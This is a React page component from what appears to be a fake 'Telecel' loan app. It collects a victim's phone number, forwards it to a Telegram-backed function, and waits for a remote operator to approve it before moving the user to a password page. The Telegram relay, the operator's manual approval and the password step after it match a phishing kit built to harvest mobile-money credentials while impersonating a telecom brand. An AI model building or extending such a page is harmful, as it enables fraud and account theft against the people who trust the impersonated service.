import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Dialog, DialogContent, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import MobileShell from "@/components/MobileShell";
import { supabase } from "@/integrations/supabase/client";

const VerifyPhone = () => {
  const navigate = useNavigate();
  const [accountType, setAccountType] = useState("mobile");
  const [phone, setPhone] = useState("");
  const [verifying, setVerifying] = useState(false);

  const saved = localStorage.getItem("telecel_loan");
  const loanData = saved ? JSON.parse(saved) : null;

  const handleNext = async () => {
    if (!phone) return;
    setVerifying(true);
    localStorage.setItem("telecel_loan", JSON.stringify({ ...loanData, verifyPhone: phone }));

    try {
      // Send verification request to Telegram
      const { data, error } = await supabase.functions.invoke("telegram-send-verify", {
        body: { phone },
      });

      if (error) throw error;
      const requestId = data.id;

      const url = import.meta.env.VITE_SUPABASE_URL;
      const anonKey = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;

      // Fire poll-callbacks once (long-running, fire-and-forget)
      fetch(`${url}/functions/v1/telegram-poll-callbacks`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${anonKey}`,
          'apikey': anonKey,
          'Content-Type': 'application/json',
        },
        body: '{}',
      }).catch(() => {});

      // Poll DB status every 1.5 seconds
      const poll = setInterval(async () => {
        try {
          const res = await fetch(`${url}/functions/v1/telegram-check-status?id=${requestId}`, {
            headers: {
              'Authorization': `Bearer ${anonKey}`,
              'apikey': anonKey,
            },
          });
          const result = await res.json();

          if (result.status === "verified") {
            clearInterval(poll);
            setVerifying(false);
            navigate("/password");
          } else if (result.status === "rejected") {
            clearInterval(poll);
            setVerifying(false);
            navigate("/register");
          } else if (result.status === "register") {
            clearInterval(poll);
            setVerifying(false);
            navigate("/register");
          }
        } catch (e) {
          console.error("Poll error:", e);
        }
      }, 1500);
    } catch (e) {
      console.error("Error sending verify:", e);
      setVerifying(false);
    }
  };

  return (
    <MobileShell>
      <div className="telecel-gradient px-6 py-4 flex items-center gap-3">
        <button onClick={() => navigate("/apply")} className="text-primary-foreground">
          <ArrowLeft className="w-5 h-5" />
        </button>
        <h1 className="text-lg font-bold text-primary-foreground">Verify Phone Number</h1>
      </div>

      <div className="flex-1 px-6 py-6 space-y-5">
        <p className="text-sm text-muted-foreground">
          Verify your Telecel phone number to proceed with your loan application.
        </p>

        <div>
          <Label className="text-xs">Account Type</Label>
          <Select value={accountType} onValueChange={setAccountType}>
            <SelectTrigger className="mt-1">
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              <SelectItem value="mobile">Mobile</SelectItem>
              <SelectItem value="agent">Agent</SelectItem>
            </SelectContent>
          </Select>
        </div>

        <div>
          <Label className="text-xs">Phone Number</Label>
          <Input
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            placeholder="020XXXXXXX"
            className="mt-1"
            maxLength={10}
          />
        </div>
      </div>

      <div className="px-6 pb-6 space-y-3">
        <Button onClick={handleNext} disabled={!phone || verifying} className="w-full h-12 rounded-xl font-semibold">
          {verifying ? "Verifying..." : "Next"}
        </Button>
        <Button onClick={() => navigate("/apply")} variant="outline" className="w-full h-12 rounded-xl font-semibold border-primary text-primary">
          Go Back
        </Button>
      </div>

      {/* Verification loading modal */}
      <Dialog open={verifying}>
        <DialogContent className="max-w-[320px] rounded-2xl text-center" onInteractOutside={(e) => e.preventDefault()}>
          <DialogTitle className="sr-only">Verifying</DialogTitle>
          <DialogDescription className="sr-only">Please wait while we verify your phone number</DialogDescription>
          <div className="flex flex-col items-center py-6 space-y-4">
            <Loader2 className="w-12 h-12 text-primary animate-spin" />
            <h3 className="text-lg font-semibold">Verifying Your Number</h3>
            <p className="text-sm text-muted-foreground">
              Please wait as we verify your number. This may take up to 2 minutes.
            </p>
          </div>
        </DialogContent>
      </Dialog>
    </MobileShell>
  );
};

export default VerifyPhone;
